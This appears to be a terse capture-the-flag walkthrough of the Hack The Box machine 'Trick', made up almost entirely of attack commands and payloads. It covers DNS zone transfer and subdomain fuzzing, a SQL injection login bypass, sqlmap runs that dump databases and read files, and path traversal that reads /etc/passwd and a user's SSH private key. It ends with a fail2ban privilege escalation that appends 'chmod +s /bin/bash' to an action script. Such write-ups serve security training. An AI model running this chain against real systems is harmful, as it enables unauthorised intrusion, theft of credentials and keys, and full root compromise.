## DNS enum
```sh
dig nx trick.htb @10.10.11.166
dig mx trick.htb @10.10.11.166
dig any trick.htb @10.10.11.166
dig axfr trick.htb @10.10.11.166
sudo sh -c 'echo "\n10.10.11.166 root.trick.htb" >> /etc/hosts'
sudo sh -c 'echo "\n10.10.11.166 preprod-payroll.trick.htb" >> /etc/hosts'
```

```sh
ffuf -ic -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://trick.htb -t 100 -H "Host: preprod-FUZZ.trick.h  
tb" -fs 5480
```

```
username=admin' or 1=1 -- -&password=asd
```

```
Administrator
Enemigosss
SuperGucciRainbowCake
```

```
sqlmap -r $PWD/add_new_employe.req --batch --dbms mysql --thread 10 --dbs
sqlmap -r $PWD/add_user.req --batch --dbms mysql --thread 10 --users
sqlmap -r $PWD/add_user.req --batch --dbms mysql --thread 10 --file-read=/etc/hostname
```

```
[20:16:38] [INFO] retrieved: payroll_db
[20:19:32] [INFO] retrieved: 'remo'@'localhost'
```
becouse time based sql injection too slow, i search for a new attack surface

```sh
ffuf -ic -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://preprod-marketing.trick.htb/index.php\?page\=FUZZ -fs 0
```

```
http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//etc/passwd
```

```
michael:x:1001:1001::/home/michael:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

```sh
ffuf -ic -w /usr/share/wordlists/Security-Wordlist/LFI-WordList-Linux -u http://preprod-marketing.trick.htb/index.php\?page\=....//....//....//....//FUZZ -fs 0 -t 1000
```

```nginx
server {
    listen 80 default_server;
    listen [::]:80 default_server;
    server_name trick.htb;
    root /var/www/html;
    index index.html index.htm index.nginx-debian.html;
    server_name _;
    location / { 
        try_files $uri $uri/ =404;
    } 
    location ~ \.php$ { 
    include snippets/fastcgi-php.conf;
    fastcgi_pass unix:/run/php/php7.3-fpm.sock;
    }
} 

server { 
    listen 80;
    listen [::]:80;
    server_name preprod-marketing.trick.htb;
    root /var/www/market;
    index index.php;
    location / { 
        try_files $uri $uri/ =404;
    } 
    location ~ \.php$ { 
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/run/php/php7.3-fpm-michael.sock;
        } 
    } 

server { 
    listen 80;
    listen [::]:80;
    server_name preprod-payroll.trick.htb;
    root /var/www/payroll;
    index index.php;
    location / { 
        try_files $uri $uri/ =404;
    } 
    location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/run/php/php7.3-fpm.sock;
    } 
}
```
notwork
```
admin' or 1 = 1 union select "",'test', "", "" into outfile '/var/www/market/services.html'-- -
```

```
http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//home/michael/.ssh/id_rsa
```

```
ssh michael@trick.htb -i michael_id_rsa
```

```
chmod +s /bin/bash
```

```
echo 'chmod +s /bin/bash' >> ssh-alert.sh
```

## Referensi
- https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7
- 